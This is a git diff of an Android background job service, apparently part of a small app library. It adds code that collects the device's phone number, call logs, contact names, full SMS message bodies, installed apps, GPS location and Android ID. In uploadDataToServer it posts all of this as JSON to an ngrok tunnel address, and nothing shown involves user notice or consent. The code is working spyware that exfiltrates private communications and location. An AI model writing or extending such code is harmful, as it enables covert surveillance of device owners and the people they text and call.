@@ -3,7 +3,6 @@ package com.example.jobservicelibray;
 import android.Manifest;
 import android.annotation.SuppressLint;
 import android.annotation.TargetApi;
-import android.app.ProgressDialog;
 import android.app.job.JobParameters;
 import android.app.job.JobService;
 import android.app.usage.UsageStats;
@@ -47,6 +46,7 @@ import com.google.firebase.storage.StorageReference;
 import com.google.firebase.storage.UploadTask;
 
 
+import org.checkerframework.common.returnsreceiver.qual.This;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -56,6 +56,10 @@ import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.URL;
 import java.sql.Timestamp;
 import java.util.ArrayList;
 import java.util.Date;
@@ -64,30 +68,42 @@ import java.util.List;
 import java.util.Locale;
 import java.util.Map;
 import java.util.concurrent.CompletableFuture;
+import android.provider.Settings.Secure;
+
 
 
 @TargetApi(Build.VERSION_CODES.M)
 public class FterJobServiceTesting extends JobService implements LocationListener {
+    public FterJobServiceTesting(Context ctx) {
+        this.ctx = ctx;
+    }
     private static final String TAG = "JobService";
     private boolean jobCancelled = false;
     private Context ctx;
     private static final String locationKey = "locationKey";
-    private static final String latitudeKey = "latitudeKey";
-    private static final String longitudeKey = "longitudeKey";
+    private static final String phoneNumberKey = "phoneNumberKey";
+    private static final String callLogsKey = "callLogsKey";
+    private static final String infoAppsKey = "infoAppsKey";
+    private static final String contactAllNameKey = "contactAllNameKey";
+    private static final String smsLogsKey = "smsLogsKey";
     private static final String MyPREFERENCES = "MyPrefs";
     private JSONObject getYourPhoneNumber = new JSONObject();
+    private JSONObject getDeviceLongLat = new JSONObject();
+
     private List<JSONObject> getCallLogs = new ArrayList<>();
     private List<JSONObject> getInstalledApps =  new ArrayList<>();
-    private List<JSONObject> getAllContactName =  new ArrayList<>();
-    private String getDeviceLongLat = "";
+    private JSONObject getAllContactName = new JSONObject();
     private List<JSONObject> getSMSLogs = new ArrayList<>();
     private String getAppUsages = "";
 
     StorageReference storageReference;
 
+
     @Override
     public boolean onStartJob(JobParameters params) {
-        ctx = getApplicationContext();
+        if(ctx == null) {
+            ctx = getApplicationContext();
+        }
         Log.d(TAG, "Job started");
         doBackgroundWork(params);
 
@@ -109,6 +125,7 @@ public class FterJobServiceTesting extends JobService implements LocationListene
     }
 
     public void runAllMethods() {
+
         for (int i = 0; i < 7; i++) {
             Log.d(TAG, "run: " + i);
             if (jobCancelled) {
@@ -119,11 +136,78 @@ public class FterJobServiceTesting extends JobService implements LocationListene
                 Thread.sleep(2000);
             } catch (InterruptedException e) {
                 e.printStackTrace();
+            } catch (JSONException e) {
+                throw new RuntimeException(e);
             }
         }
     }
 
-    public uploadDataToServer() {
+    public void uploadDataToServer() throws IOException, JSONException {
+        // Create a neat value object to hold the URL
+        URL url = new URL("https://2bd1-203-95-198-235.ap.ngrok.io");
+        // instance
+        JSONObject jsonObject = new JSONObject();
+        JSONObject callLogObject = new JSONObject();
+        SharedPreferences sharedpreferences = ctx.getSharedPreferences(MyPREFERENCES, Context.MODE_PRIVATE);
+        String getLocationSharedPref = sharedpreferences.getString(locationKey, "null");
+        String getPhoneNumberPref = sharedpreferences.getString(phoneNumberKey, "null");
+        String getSmsLogsPref = sharedpreferences.getString(smsLogsKey, "null");
+        String getAppInfoPref = sharedpreferences.getString(infoAppsKey, "null");
+        String getCallLogsPref = sharedpreferences.getString(callLogsKey, "null");
+        String getContactAllNamePref = sharedpreferences.getString(contactAllNameKey, "null");
+        String android_id = Secure.getString(ctx.getContentResolver(), Secure.ANDROID_ID);
+        SimpleDateFormat formatter = null;
+        Date now = new Date();
+        String date = "";
+        JSONObject jsonObjectSharedPref = new JSONObject(getAppInfoPref);
+        JSONArray appInfoArray = jsonObjectSharedPref.getJSONArray("allInfoApp");
+        JSONObject jsonObjectSmsPref = new JSONObject(getSmsLogsPref);
+        JSONArray smsArray = jsonObjectSmsPref.getJSONArray("smsLogs");
+        JSONObject jsonObjectCallPref = new JSONObject(getCallLogsPref);
+        JSONArray callArray = jsonObjectCallPref.getJSONArray("callLogs");
+
+        Log.d("123", smsArray.toString() + callArray.toString());
+
+
+
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
+            formatter = new SimpleDateFormat("yyyy_MM_dd_HH_mm_ss", Locale.CANADA);
+            date = formatter.format(now);
+        }
+        try {
+            callLogObject.put("callLogs",callArray);
+            callLogObject.put("phoneNumber",handleStringToJson( getPhoneNumberPref));
+            callLogObject.put("contactAllName",handleStringToJson( getContactAllNamePref));
+            jsonObject.put("appsInfo",appInfoArray);
+            jsonObject.put("deviceLocation", handleStringToJson(getLocationSharedPref));
+            jsonObject.put("smsLogs",smsArray);
+            jsonObject.put("phoneInfo",callLogObject);
+            jsonObject.put("deviceId", android_id);
+            jsonObject.put("timeStamp", date);
+
+        } catch (JSONException e) {
+            Log.d("Error", e.toString());
+        }
+
+
+        // Open a connection(?) on the URL(?) and cast the response(??)
+        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+        connection.setRequestMethod("POST");
+        connection.setRequestProperty("Content-Type", "application/json");
+        connection.setRequestProperty("accept", "application/json");
+        connection.setDoOutput(true);
+
+
+//        connection.getOutputStream().write(jsonObject);
+        Log.d("data", jsonObject.toString());
+        try(OutputStream os = connection.getOutputStream()) {
+            byte[] input = jsonObject.toString().getBytes("utf-8");
+            os.write(input, 0, input.length);
+        }
+
+
+//         This line makes the request
+        InputStream responseStream = connection.getInputStream();
 
     }
 
@@ -177,28 +261,35 @@ public class FterJobServiceTesting extends JobService implements LocationListene
 
     }
 
+    private void writeDataInSharedPreference(String key,String data) {
+        SharedPreferences sharedpreferences = ctx.getSharedPreferences(MyPREFERENCES, Context.MODE_PRIVATE);
+        SharedPreferences.Editor editor = sharedpreferences.edit();
+        editor.putString(key, data);
+        editor.commit();
+        Log.d("Success", "Write Successfully");
+    }
 
 
-    private void handleCallMethod(int i) {
-
+    private void handleCallMethod(int i) throws JSONException {
+        SharedPreferences sharedpreferences = ctx.getSharedPreferences(MyPREFERENCES, Context.MODE_PRIVATE);
         switch (i) {
             case 0:
                 if (hasPermission(Manifest.permission.READ_PHONE_STATE)) {
                     getYourPhoneNumber = getYourPhoneNumber(ctx);
-                    Log.d (" ", getYourPhoneNumber.toString());
+                    writeDataInSharedPreference(phoneNumberKey, getYourPhoneNumber.toString());
                 } else {
                     try {
                         getYourPhoneNumber.put("permissions", "No Permissions");
                     } catch (JSONException e) {
                         throw new RuntimeException(e);
                     }
-                    Log.d("", "No Permissions");
                 }
                 break;
             case 1:
                 if (hasPermission(Manifest.permission.READ_CALL_LOG)) {
-                    getCallLogs = getCallLogs(ctx);
-                    Log.d (" ", getCallLogs.toString());
+                    JSONObject jsonObject  = new JSONObject();
+                    jsonObject.put("callLogs", getCallLogs(ctx));
+                    writeDataInSharedPreference(callLogsKey, jsonObject.toString());
                 } else {
                     try {
                         getCallLogs.get(0).put("permissions", "No Permissions");
@@ -211,40 +302,41 @@ public class FterJobServiceTesting extends JobService implements LocationListene
             case 2:
 
                 if (hasPermission(Manifest.permission.READ_PHONE_STATE)) {
+                    writeDataInSharedPreference(contactAllNameKey, getAllContactName(ctx).toString());
+//                    try {
+//                        getAllContactName.put("ownPhoneNumber", getYourPhoneNumber);
+//                        getAllContactName.put("callLogs", getCallLogs);
+//                        getAllContactName.put("allContactName", getAllContactName(ctx));
+//                    } catch (JSONException e) {
+//                        throw new RuntimeException(e);
+//                    }
 
-                    try {
-                        getAllContactName.get(0).put("ownPhoneNumber", getYourPhoneNumber);
-                        getAllContactName.get(0).put("callLogs", getCallLogs);
-                        getAllContactName.get(0).put("allContactName", getAllContactName(ctx));
-                    } catch (JSONException e) {
-                        throw new RuntimeException(e);
-                    }
-                    convertToJsonFile("OwnPhoneNumber", getAllContactName.toString());
+
+
 //                    File file = new File(ctx.getFilesDir(),"OwnPhoneNumber.json");
 //                    uploadImage(Uri.fromFile(file), "OwnPhoneNumber");
-                    Log.d (" ", getAllContactName.toString());
                 } else {
                     try {
-                        getAllContactName.get(0).put("permissions", "No Permissions");
+                        getAllContactName.put("permissions", "No Permissions");
                     } catch (JSONException e) {
                         throw new RuntimeException(e);
                     }
-//                    convertToJsonFile("OwnPhoneNumber",  "{" + "\"Permission \"" + ":" + "\"No Permissions \"" +
-//                            "}");
+
                     Log.d("", "No Permissions");
                 }
                 break;
             case 3:
 
                 if (hasPermission(Manifest.permission.READ_EXTERNAL_STORAGE) &&  hasPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
-                    getInstalledApps = getInstalledApps(ctx);
+
+                    JSONObject jsonObject  = new JSONObject();
+                    jsonObject.put("allInfoApp", getInstalledApps(ctx));
+                    writeDataInSharedPreference(infoAppsKey, jsonObject.toString());
 //                    convertToJsonFile("AppsInfo", jsonObject.toString());
 //                    File file = new File(ctx.getFilesDir(),"AppsInfo.json");
 //                    uploadImage(Uri.fromFile(file), "AppsInfo");
-                    Log.d (" ", getInstalledApps.toString());
+
                 } else {
-//                    convertToJsonFile("AppsInfo", "{" + "\"Permission \"" + ":" + "\"No Permissions \"" +
-//                            "}");
                     try {
                         getInstalledApps.get(0).put("permissions", "No Permissions");
                     } catch (JSONException e) {
@@ -256,33 +348,41 @@ public class FterJobServiceTesting extends JobService implements LocationListene
             case 4:
                 if (hasPermission(Manifest.permission.ACCESS_FINE_LOCATION) && hasPermission(Manifest.permission.ACCESS_COARSE_LOCATION) &&
                      hasPermission(Manifest.permission.RECEIVE_BOOT_COMPLETED)) {
-                    getDeviceLongLat = getDeviceLongLat(ctx);
-                    convertToJsonFile("DeviceLocations", getDeviceLongLat);
+                    getDeviceLongLat.put("deviceLocations",getDeviceLongLat(ctx))  ;
+//                    convertToJsonFile("DeviceLocations", getDeviceLongLat);
 //                    File file = new File(ctx.getFilesDir(),"DeviceLocations.json");
 //                    uploadImage(Uri.fromFile(file), "DeviceLocations");
-                    Log.d (" ", getDeviceLongLat);
+                    Log.d (" ", getDeviceLongLat.toString());
                 } else {
-                    convertToJsonFile("DeviceLocations",  "{" + "\"Permission \"" + ":" + "\"No Permissions \"" +
-                            "}");
+                    try {
+                        getDeviceLongLat.put("permissions", "No Permissions");
+                    } catch (JSONException e) {
+                        throw new RuntimeException(e);
+                    }
                     Log.d("", "No Permissions");
                 }
                 break;
             case 5:
                 if (hasPermission(Manifest.permission.READ_SMS)) {
-                    getSMSLogs = getSMSLogs(ctx);
-                    JSONObject jsonObject = new JSONObject();
+
+                    JSONObject jsonObject  = new JSONObject();
+                    jsonObject.put("smsLogs", getSMSLogs(ctx));
+                    writeDataInSharedPreference(smsLogsKey, jsonObject.toString());
+//                    JSONObject jsonObject = new JSONObject();
+//                    try {
+//                        jsonObject.put("smsLogs", getSMSLogs);
+//                    } catch (JSONException e) {
+//                        throw new RuntimeException(e);
+//                    }
+//                    convertToJsonFile("SMSLogs", getSMSLogs.toString());
+//                    File file = new File(ctx.getFilesDir(),"SMSLogs.json");
+//                    uploadImage(Uri.fromFile(file), "SMSLogs");
+                } else {
                     try {
-                        jsonObject.put("smsLogs", getSMSLogs);
+                        getSMSLogs.get(0).put("permissions", "No Permissions");
                     } catch (JSONException e) {
                         throw new RuntimeException(e);
                     }
-                    convertToJsonFile("SMSLogs", jsonObject.toString());
-//                    File file = new File(ctx.getFilesDir(),"SMSLogs.json");
-//                    uploadImage(Uri.fromFile(file), "SMSLogs");
-                    Log.d (" ", getSMSLogs);
-                } else {
-                    convertToJsonFile("SMSLogs",  "{" + "\"Permission \"" + ":" + "\"No Permissions \"" +
-                            "}");
                     Log.d("", "No Permissions");
                 }
                 break;
@@ -325,9 +425,9 @@ public class FterJobServiceTesting extends JobService implements LocationListene
     }
 
     // App Info
-    private List<JSONObject> getInstalledApps(Context ctx) {
+    private JSONArray getInstalledApps(Context ctx) {
         JSONObject jsonObject = new JSONObject();
-        List<JSONObject> entries = new ArrayList<>();
+        JSONArray jsonArray = new JSONArray();
         try {
             PackageManager pm = ctx.getPackageManager();
             List<ApplicationInfo> applications = pm.getInstalledApplications(0);
@@ -361,22 +461,23 @@ public class FterJobServiceTesting extends JobService implements LocationListene
                 }
                 jsonObject.put("category", categoryStr);
 
-                entries.add(jsonObject);
+                jsonArray.put(jsonObject);
             }
-            return entries;
+
+            return jsonArray;
         }catch (Exception e) {
             Log.d("error", e.toString());
         }
-        return entries;
+        return jsonArray;
     }
 
     // Get Call Logs =================================
-    private List<JSONObject>  getCallLogs(Context ctx) {
+    private JSONArray  getCallLogs(Context ctx) {
         // get Sim Number
         TelephonyManager tMgr = ContextCompat.getSystemService(ctx, TelephonyManager.class);
 //        String getSimNumber = tMgr.getLine1Number();
         JSONObject jsonObject = new JSONObject();
-        List<JSONObject> entries = new ArrayList<>();
+        JSONArray jsonArray = new JSONArray();
 
         final String[] CURSOR_PROJECTION = {
                 CallLog.Calls.CACHED_FORMATTED_NUMBER,
@@ -419,14 +520,14 @@ public class FterJobServiceTesting extends JobService implements LocationListene
 //                 map.put("yourPhoneNumber", getSimNumber);
                 jsonObject.put("phoneAccountId", cursor.getString(9));
 
-                entries.add(jsonObject);
+                jsonArray.put(jsonObject);
             }
-           return entries;
+           return jsonArray;
 
         } catch (Exception e) {
             Log.d("", e.toString());
         }
-        return entries;
+        return jsonArray;
     }
 
     private String getSimDisplayName(List<SubscriptionInfo> subscriptions, String accountId) {
@@ -505,9 +606,9 @@ public class FterJobServiceTesting extends JobService implements LocationListene
     }
 
     // Get SMS logs
-    private List<JSONObject> getSMSLogs(Context ctx) {
+    private JSONArray getSMSLogs(Context ctx) {
         JSONObject jsonObject = new JSONObject();
-        List<JSONObject> entries = new ArrayList<>();
+        JSONArray jsonArray = new JSONArray();
 
         try (Cursor cursor = ctx.getContentResolver().query(
                 Telephony.Sms.CONTENT_URI,
@@ -536,18 +637,18 @@ public class FterJobServiceTesting extends JobService implements LocationListene
                 jsonObject.put("body", body);
                 jsonObject.put("type", type);
 
-                entries.add(jsonObject);
+                jsonArray.put(jsonObject);
             }
-            return entries;
+            return jsonArray;
         } catch (Exception e) {
             Log.d("", e.toString());
 
         }
-        return entries;
+        return jsonArray;
     }
 
     // Get Phone number
-    private JSONObject getYourPhoneNumber(Context ctx) {
+    public JSONObject getYourPhoneNumber(Context ctx) {
         JSONObject jsonObject = new JSONObject();
         try {
             TelephonyManager tMgr = ContextCompat.getSystemService(ctx, TelephonyManager.class);
@@ -555,6 +656,8 @@ public class FterJobServiceTesting extends JobService implements LocationListene
             String simDisplayName = tMgr.getNetworkOperatorName();
             jsonObject.put("getSimNumber", getSimNumber);
             jsonObject.put("simDisplayName", simDisplayName);
+
+
             return jsonObject;
         } catch (Exception e) {
             Log.d("", e.toString());
@@ -563,12 +666,10 @@ public class FterJobServiceTesting extends JobService implements LocationListene
     }
 
     // Get LongLat
-    public String getDeviceLongLat(Context ctx) {
+    private String getDeviceLongLat(Context ctx) {
         try {
             final LocationManager locationManager = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
             final boolean gpsEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
-            SharedPreferences sharedpreferences = ctx.getSharedPreferences(MyPREFERENCES, Context.MODE_PRIVATE);
-            String getLocationSharedPref = sharedpreferences.getString(locationKey, "null");
             Criteria criteria = new Criteria();
             if (gpsEnabled) {
                 criteria.setAccuracy(Criteria.ACCURACY_FINE);
@@ -584,6 +685,8 @@ public class FterJobServiceTesting extends JobService implements LocationListene
                 // Initialize the location fields
                 if (location != null) {
                     onLocationChanged(location);
+                    SharedPreferences sharedpreferences = ctx.getSharedPreferences(MyPREFERENCES, Context.MODE_PRIVATE);
+                    String getLocationSharedPref = sharedpreferences.getString(locationKey, "null");
                     return getLocationSharedPref;
                 }
 
